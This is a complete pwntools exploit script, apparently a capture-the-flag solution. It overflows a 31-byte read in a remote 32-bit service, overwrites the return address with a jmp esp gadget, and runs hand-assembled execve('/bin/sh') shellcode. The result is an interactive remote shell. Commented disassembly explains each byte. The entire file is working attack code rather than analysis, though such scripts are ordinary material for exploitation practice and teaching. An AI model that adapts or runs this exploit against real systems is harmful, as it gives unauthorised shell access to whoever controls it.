#!/usr/bin/env python3
from pwn import *
import time
import getopt
import sys

opts,argv=getopt.getopt(sys.argv[1:], 't:p:')

for k,v in opts:
    if k == '-t':
        target=v
    elif k == '-p':
        port=v

io=remote(target, port)

#sleep(10)

# 18 bytes shellcode, ecx & edx needs to be 0.
#
#0:  6a 0b                   push   0xb
#2:  58                      pop    eax
#3:  51                      push   ecx
#4:  68 2f 2f 73 68          push   0x68732f2f
#9:  68 2f 62 69 6e          push   0x6e69622f
#e:  89 e3                   mov    ebx,esp
#10: cd 80                   int    0x80

shellcode=b"\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

# Read() takes in 31 bytes. First 18 bytes are shellcode.
# Next 4 bytes to overwrite return address and we have 9 bytes left.
# 9 bytes to setup registers and jump backward 31 bytes to the beginning of vuln's buff.
#
#0:  83 ec 40                sub    esp,0x40
#3:  31 d2                   xor    edx,edx
#5:  31 c9                   xor    ecx,ecx
#7:  eb e1                   jmp    $eip-0x1f

xor_jmp=b"\x83\xec\x40\x31\xd2\x31\xc9\xeb\xe1"
jmp_esp=0x0804919f

payload=shellcode
payload+=p32(jmp_esp)
payload+=xor_jmp

io.sendlineafter(b'>', payload) 

io.interactive()


